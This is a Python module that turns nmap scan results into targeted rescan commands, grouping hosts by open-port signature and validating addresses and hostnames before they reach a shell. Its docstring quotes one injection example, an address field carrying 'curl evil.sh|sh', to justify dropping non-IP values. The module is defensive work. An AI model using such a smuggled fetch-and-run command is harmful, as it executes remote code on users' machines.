"""Turn what a scan found into the nmap command that scans only *that*.

A finished scan already knows which hosts are up and which ports they have
open.  That is exactly the input the next pass needs: instead of sweeping whole
hosts again, aim at the ports that are known to exist.

nmap takes one port list per invocation and applies it to every target, so
"only what exists" cannot be a single command -- ``-p 22,80,443 a b c`` probes
all three ports on all three hosts.  The precision comes from **grouping by
port signature**: hosts whose open ports are exactly the same set share one
command, and a host never receives a port it does not have.

Two rules keep the generated line honest:

* **The group decides the scan types, not the profile.**  From the profile we
  only inherit *which* TCP variant it wanted, so a deliberate ``-sT`` survives;
  a UDP-only group never drags along an orphan ``-sS``.  A mixed group does get
  an explicit TCP type, because ``-sU`` without one makes nmap ignore the
  ``T:`` half of the port spec.
* **Addresses are validated before they reach a command line.**  ``addr`` is
  CDATA in nmap.dtd, so ``addr="10.0.0.1; curl evil.sh|sh"`` is a valid report.
  Here the sink is a shell and the reader's clipboard, so anything that is not
  an IP address is dropped rather than escaped.

The arguments may carry ``$[...]`` variables (see :data:`VARIABLES`), which is
what makes ``-oA scans/$[HOSTNAME]`` a per-target output name instead of one
file that every command overwrites.  ``$[IP]`` and ``$[HOSTNAME]`` name a
single host, so as soon as one of them appears the grouping is undone: the
group becomes one command per host, because a value that differs per host
cannot be written once into a shared command.  Hostnames get the same "drop,
do not escape" treatment as addresses.

This module is pure: no config, no UI, no imports from :mod:`xnp`.  The report
carries a JavaScript port of the same rules (see ``TARGET_SHAPES`` and
``signatureGroups`` in ``xnp/data/report/report.js``) -- **keep the two in sync**.
"""

import ipaddress
import re
import shlex
from dataclasses import dataclass

#: Ports live under one of these; anything else (``-sO`` protocol numbers,
#: sctp) is not a port in the sense ``-p T:/U:`` means.
PROTOCOLS = ("tcp", "udp")

#: Flags that name the ports to scan.  A rescan supplies its own ``-p``, so
#: whatever the profile said about ports is replaced, not merged.
PORT_SPEC_FLAGS = ("-p", "--top-ports", "--exclude-ports", "--exclude-port")

#: TCP scan types, listed one by one on purpose: ``-sV`` and ``-sC`` also start
#: with ``-s`` and are not scan types at all.
TCP_SCAN_TYPES = ("-sS", "-sT", "-sA", "-sW", "-sM", "-sN", "-sF", "-sX")

#: Scans that cannot take a TCP/UDP port list: host discovery only (``-sn``,
#: ``-sL``, ``-sP``), IP protocol scan (``-sO``) and sctp (``-sY``, ``-sZ``).
INCOMPATIBLE_SCANS = ("-sn", "-sL", "-sP", "-sO", "-sY", "-sZ")

#: Flags that make nmap need a raw socket, and so root.
ROOT_FLAGS = frozenset(set(TCP_SCAN_TYPES) - {"-sT"} | {"-sU", "-sO", "-O", "-A"})

#: ``$[NAME]`` anywhere inside a token.  The brackets tell an XNP variable from
#: an environment variable the reader may also want in the line.  They do not
#: hide it from a shell -- ``$[...]`` is bash's deprecated arithmetic expansion
#: -- so ``--rescan-args`` carrying one has to be single-quoted; by the time a
#: command is printed the variable is already a value.
VARIABLE_RE = re.compile(r"\$\[([A-Za-z_][A-Za-z0-9_]*)\]")

#: Variables whose value names one host.  Using one splits its group into one
#: command per host -- see :func:`expand`.
PER_HOST_VARIABLES = ("IP", "HOSTNAME")

#: Variables whose value is the same for every host of a group.
GROUP_VARIABLES = ("PORTS", "TCP_PORTS", "UDP_PORTS")

#: Every variable an argument string may use.
VARIABLES = PER_HOST_VARIABLES + GROUP_VARIABLES

#: A hostname ends up in a shell line and in a file name, and it comes from the
#: XML, where it is as free-form as the address is.  Same treatment: what is
#: not one of these characters is dropped, not escaped.
UNSAFE_IN_HOSTNAME = re.compile(r"[^A-Za-z0-9._-]")


@dataclass(frozen=True)
class RescanGroup:
    """Hosts that share one port signature, and so share one command."""

    family: str
    tcp: tuple
    udp: tuple
    hosts: tuple
    #: Resolved name per host, positionally aligned with ``hosts`` and ``""``
    #: where the scan found none.  Defaulted so a group built by hand -- in a
    #: test, or by code that predates the variables -- stays valid.
    names: tuple = ()

    @property
    def port_count(self) -> int:
        return len(self.tcp) + len(self.udp)

    def name_of(self, index: int = 0) -> str:
        """The host's name, falling back to its address.

        The fallback is what makes ``-oA scans/$[HOSTNAME]`` usable on a scan
        that resolved nothing: a file per host either way, named by whichever
        identifier exists.
        """
        if not self.hosts:
            return ""
        name = self.names[index] if index < len(self.names) else ""
        return name or self.hosts[index]


@dataclass(frozen=True)
class RescanCommand:
    """One generated command, with what had to be dropped to build it."""

    group: RescanGroup
    command: str
    #: Profile flags left out because the rescan decides them itself.
    dropped: tuple = ()


def address_family(address) -> str:
    """``"ipv4"``/``"ipv6"`` for a real address, ``""`` for anything else.

    :mod:`ipaddress` rather than a regex: it is exact about octet ranges and
    about the many shapes of IPv6, and this is the check standing between a
    scanned host's XML and a shell command.
    """
    try:
        parsed = ipaddress.ip_address(str(address))
    except ValueError:
        return ""
    return "ipv6" if parsed.version == 6 else "ipv4"


def _address_key(address):
    """Sort addresses numerically, so 10.0.0.9 comes before 10.0.0.20."""
    return int(ipaddress.ip_address(address))


def safe_hostname(name) -> str:
    """A hostname fit for a shell line and a file name, or ``""``.

    Dropping the offending characters rather than replacing them keeps a
    resolved name recognisable (``web 01.lab`` becomes ``web01.lab``) without
    ever inventing one: a name made only of them comes back empty, and the
    caller falls back to the address.
    """
    cleaned = UNSAFE_IN_HOSTNAME.sub("", str(name or "")).strip(".-")
    return cleaned[:253]


def group_by_signature(targets, states=("open",)) -> list:
    """Group ``(address, protocol, port, state[, hostname])`` into rescan groups.

    The signature is ``(family, tcp ports, udp ports)``.  Family is part of it
    because IPv4 and IPv6 targets cannot share an nmap invocation, and IPv6
    needs ``-6``.  The hostname is optional and never part of the signature:
    two hosts with the same open ports keep sharing a command, and the names
    only matter once the arguments ask for one.
    """
    wanted = frozenset(states or ())
    per_host = {}
    names = {}

    for target in targets:
        address, protocol, port, state = target[:4]
        hostname = target[4] if len(target) > 4 else ""
        if state not in wanted:
            continue
        protocol = (protocol or "").lower()
        if protocol not in PROTOCOLS:
            continue
        family = address_family(address)
        if not family:
            continue
        try:
            number = int(port)
        except (TypeError, ValueError):
            continue
        if not 0 < number < 65536:
            continue
        per_host.setdefault((family, str(address)), {"tcp": set(), "udp": set()})
        per_host[(family, str(address))][protocol].add(number)
        hostname = safe_hostname(hostname)
        # Several files of one run can resolve the same address to different
        # names, and targets arrive as an unordered set: the smallest name wins
        # so two runs over the same scan produce the same command.
        if hostname and (str(address) not in names or hostname < names[str(address)]):
            names[str(address)] = hostname

    signatures = {}
    for (family, address), ports in per_host.items():
        signature = (family, tuple(sorted(ports["tcp"])), tuple(sorted(ports["udp"])))
        signatures.setdefault(signature, []).append(address)

    groups = []
    for (family, tcp, udp), hosts in signatures.items():
        hosts = tuple(sorted(hosts, key=_address_key))
        groups.append(RescanGroup(family=family, tcp=tcp, udp=udp, hosts=hosts,
                                  names=tuple(names.get(host, "") for host in hosts)))
    # Biggest first, and fully determined at every level so the output of two
    # runs over the same scan is byte for byte the same.
    groups.sort(key=lambda group: (-len(group.hosts), -group.port_count,
                                   group.family, _address_key(group.hosts[0])))
    return groups


def variables_in(args: str) -> tuple:
    """The ``$[...]`` names an argument string uses, in order, deduplicated."""
    seen = []
    for name in VARIABLE_RE.findall(args or ""):
        if name not in seen:
            seen.append(name)
    return tuple(seen)


def unknown_variables(args: str) -> tuple:
    """The ``$[...]`` names that are not ours -- left literal, reported once."""
    return tuple(name for name in variables_in(args) if name not in VARIABLES)


def uses_per_host_variable(args: str) -> bool:
    """Whether the arguments say something that differs from host to host."""
    return any(name in PER_HOST_VARIABLES for name in variables_in(args))


def expand(groups, args: str = "") -> list:
    """One group per host when the arguments name a single host, else as is.

    A group is a shared command line, so ``-oA $[IP]`` inside one would have to
    pick one of its hosts and lie about the rest.  Splitting keeps every
    command true to its own targets; the ports are the signature's either way,
    so nobody gains or loses one.
    """
    if not uses_per_host_variable(args):
        return list(groups)
    return [RescanGroup(family=group.family, tcp=group.tcp, udp=group.udp,
                        hosts=(host,), names=(group.name_of(index),))
            for group in groups
            for index, host in enumerate(group.hosts)]


def _values(group: RescanGroup) -> dict:
    """What each variable stands for in this group."""
    return {
        "IP": group.hosts[0] if group.hosts else "",
        "HOSTNAME": group.name_of(),
        "PORTS": _port_spec(group),
        "TCP_PORTS": ",".join(str(port) for port in group.tcp),
        "UDP_PORTS": ",".join(str(port) for port in group.udp),
    }


def substitute(token: str, group: RescanGroup) -> str:
    """Replace the ``$[...]`` of one token.  An unknown name stays literal.

    Leaving it alone rather than emptying it is the readable failure: a typo
    surfaces in the command instead of silently deleting part of it.
    """
    values = _values(group)
    return VARIABLE_RE.sub(lambda match: values.get(match.group(1), match.group(0)),
                           token)


def _port_spec(group: RescanGroup) -> str:
    """The ``-p`` value.  Prefixes are only needed once both halves are there."""
    tcp = ",".join(str(port) for port in group.tcp)
    udp = ",".join(str(port) for port in group.udp)
    if tcp and udp:
        return f"T:{tcp},U:{udp}"
    if udp:
        return f"U:{udp}"
    return tcp


#: One shell token, as a run of parts: quoted stretches and single characters.
#: Written this way rather than "quoted string or bare word" so that
#: ``--script="vuln and safe"`` is one token, and so that an unbalanced quote
#: stays in the token instead of raising the way ``shlex.split`` would.  The
#: bare part is **one character**, not a run of them: ``(?:[^\s"']+)+`` is the
#: classic nested quantifier, and it backtracks exponentially -- in a browser
#: that is a blown stack and a report whose script never finishes starting.
TOKEN_RE = re.compile(r"""(?:"[^"]*"|'[^']*'|[^\s"']|["'])+""")


def split_args(args: str) -> list:
    """Tokenise like a shell, keeping each token's text as it was written.

    Returns ``(value, raw)`` pairs: ``value`` is what the token *means* and is
    what the flags are matched against; ``raw`` is what the author typed, which
    is what gets printed back.  Keeping both is what lets
    ``-oA "nmap/$[IP] scan"`` come out with the quotes it was written with
    instead of the ones this module would have chosen.
    """
    tokens = []
    for match in TOKEN_RE.finditer(args or ""):
        raw = match.group(0)
        value = re.sub(r"""\"([^"]*)"|'([^']*)'""",
                       lambda part: part.group(1) if part.group(1) is not None
                       else part.group(2), raw)
        tokens.append((value, raw))
    return tokens


def _split_profile(tokens):
    """Separate what the profile keeps from what the group decides.

    Takes the ``(value, raw)`` pairs of :func:`split_args`; the flags are
    matched on the value, so ``"-sS"`` is the scan type it says it is.

    Returns ``(kept, moved, dropped)``.  The distinction matters for what the
    caller reports: ``dropped`` is gone for good, while ``moved`` flags are
    only held back so the group can decide whether to put them in -- warning
    about a ``-sS`` that ends up in the command anyway would be a lie.
    """
    kept, dropped = [], []
    moved = {"tcp_type": "", "udp": False, "six": False}
    skip_value = False

    for value, raw in tokens:
        if skip_value:
            skip_value = False
            dropped.append(value)
            continue

        if value in PORT_SPEC_FLAGS:
            dropped.append(value)
            skip_value = True
        elif value.startswith("-p") and not value.startswith("--") and len(value) > 2:
            # -p-, -p80, -p1-1000: the value is glued to the flag.
            dropped.append(value)
        elif value == "-F":
            dropped.append(value)
        elif value in INCOMPATIBLE_SCANS:
            dropped.append(value)
        elif value == "-6":
            # Re-added from the group's family, so it can never contradict it.
            moved["six"] = True
        elif value in TCP_SCAN_TYPES:
            if not moved["tcp_type"]:
                moved["tcp_type"] = value
        elif value == "-sU":
            moved["udp"] = True
        else:
            kept.append((value, raw))

    return kept, moved, tuple(dropped)


def render_token(token, group: RescanGroup) -> str:
    """One kept token, variables replaced, ready to sit on a command line.

    Quoting is the author's call when they made one: a token written with
    quotes is printed with them, because the quotes may be load-bearing -- a
    path with a space in it stops working without them, and only the person
    writing the profile knows that.  A token written bare is quoted only if it
    turns out to need it, which is also what protects an unknown ``$[...]``
    from the shell it is about to be pasted into.
    """
    value, raw = token
    if '"' in raw or "'" in raw:
        return substitute(raw, group)
    return shlex.quote(substitute(value, group))


def build_command(group: RescanGroup, args: str = ""):
    """Compose the nmap line for one group.  Returns ``(command, dropped)``.

    The order is fixed -- profile flags, ``-6``, scan types, ``-p``, targets --
    so the same group always produces the same string.

    ``$[...]`` variables are resolved against this group; a per-host one reads
    the group's **first** host, which is why :func:`commands` runs the groups
    through :func:`expand` first and hands single-host groups here.
    """
    kept, moved, dropped = _split_profile(split_args(args))
    tcp_type = moved["tcp_type"]

    # After the split, so a profile's flags are recognised as themselves: what
    # a variable expands to is a value, never a flag the generator reacts to.
    kept = [render_token(token, group) for token in kept]

    parts = ["nmap"] + kept
    if group.family == "ipv6":
        parts.append("-6")
    if group.tcp and (group.udp or tcp_type):
        # Only when it is needed: on a TCP-only group with no type in the
        # profile, nmap's own choice (-sS as root, -sT otherwise) is better
        # than forcing sudo on the reader.  A mixed group has no such luxury:
        # -sU without a TCP type makes nmap ignore the T: half of the spec.
        parts.append(tcp_type or "-sS")
    if group.udp:
        parts.append("-sU")
    parts += ["-p", _port_spec(group)]

    # A moved flag is only reported as lost when the group had no use for it:
    # a TCP type on a UDP-only group, -sU on a TCP-only one, -6 on IPv4.
    lost = list(dropped)
    if tcp_type and tcp_type not in parts:
        lost.append(tcp_type)
    if moved["udp"] and not group.udp:
        lost.append("-sU")
    if moved["six"] and group.family != "ipv6":
        lost.append("-6")

    # The kept tokens arrive quoted the way their author wrote them, and what
    # this function adds -- flags and a port spec -- never needs quoting.  The
    # hosts are appended raw: they went through address_family() and cannot
    # contain anything a shell would read.
    return " ".join(parts) + " " + " ".join(group.hosts), tuple(lost)


def commands(targets, args: str = "", states=("open",)) -> list:
    """Every rescan command for a set of targets, biggest group first."""
    built = []
    for group in expand(group_by_signature(targets, states), args):
        command, dropped = build_command(group, args)
        built.append(RescanCommand(group=group, command=command, dropped=dropped))
    return built


def needs_root(command: str) -> bool:
    """Whether the command uses a scan that needs a raw socket."""
    try:
        tokens = shlex.split(command)
    except ValueError:
        # An unbalanced quote the author typed reaches the command as typed.
        # Their problem to fix, not a reason to fail on the way to showing it.
        tokens = command.split()
    return any(token in ROOT_FLAGS for token in tokens)
